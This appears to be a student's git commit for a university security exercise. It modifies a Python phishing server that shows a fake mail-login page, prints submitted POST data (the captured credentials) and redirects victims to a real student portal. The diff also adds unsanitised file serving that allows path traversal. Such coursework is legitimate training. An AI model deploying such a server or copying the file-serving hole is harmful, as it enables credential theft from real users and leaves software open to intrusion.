17d8fe32ec9e3ba3a26d41442cad0d2fc0fa94f9
Maciej <maciej.wozny41@gmail.com>
2017-11-02 23:39:28 +0100

    zadanie 3.3 - done

--- 03-certificate/3-phishing/server.py
+++ 03-certificate/3-phishing/server.py
@@ -3,8 +3,10 @@ import ssl
 import os.path
 import os
 import mimetypes
+from cgi import parse_header, parse_multipart
+from urlparse import parse_qs
 
-REDIRECT='https://student.pwr.edu.pl'
+REDIRECT='http://student.pwr.edu.pl'
 PORT=1234
 
 
@@ -21,6 +23,7 @@ class FakeRedirect(SimpleHTTPServer.SimpleHTTPRequestHandler):
        return postvars
        
    def do_POST(self):
+          print(self.headers['content-type'])
           postvars = self.parse_POST()
           print(postvars)
           self.send_response(301)
@@ -28,12 +31,13 @@ class FakeRedirect(SimpleHTTPServer.SimpleHTTPRequestHandler):
           self.end_headers()
    
    def do_GET(self):
+       print("request: " + self.path)
        if os.path.exists('./pass.txt'):
           self.send_response(301)
 #          new_path = '%s%s'%(, self.path)
           self.send_header('Location', REDIRECT)
           self.end_headers()
-       else:
+       elif self.path == '/':
           fake = open('./serwer_pocztowy.html')
           mimetype, _ = mimetypes.guess_type('./serwer_pocztowy.html')
           self.send_response(200)
@@ -41,6 +45,15 @@ class FakeRedirect(SimpleHTTPServer.SimpleHTTPRequestHandler):
           self.end_headers()
           self.wfile.write(fake.read())
           fake.close()
+       else:
+          f = open('.' + self.path)
+          mimetype, _ = mimetypes.guess_type(self.path)
+          self.send_response(200)
+          self.send_header('Content-type', mimetype)
+          self.end_headers()
+          self.wfile.write(f.read())
+          f.close()
+       
 
           
 
